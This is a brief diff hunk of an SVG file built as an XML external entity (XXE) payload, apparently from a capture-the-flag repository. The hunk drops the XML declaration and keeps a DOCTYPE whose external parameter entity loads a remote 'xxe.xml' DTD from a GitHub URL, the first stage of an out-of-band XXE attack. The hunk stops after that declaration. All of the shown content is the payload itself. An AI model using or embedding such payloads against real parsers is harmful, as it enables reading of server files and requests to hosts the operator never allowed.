@@ -1,4 +1,3 @@
-<?xml version="1.0" standalone="yes"?>
 <!DOCTYPE svg [
 <!ELEMENT svg ANY >
 <!ENTITY % sp SYSTEM "https://raw.githubusercontent.com/noraj/SigSegV2.webserver_3/master/xxe.xml">
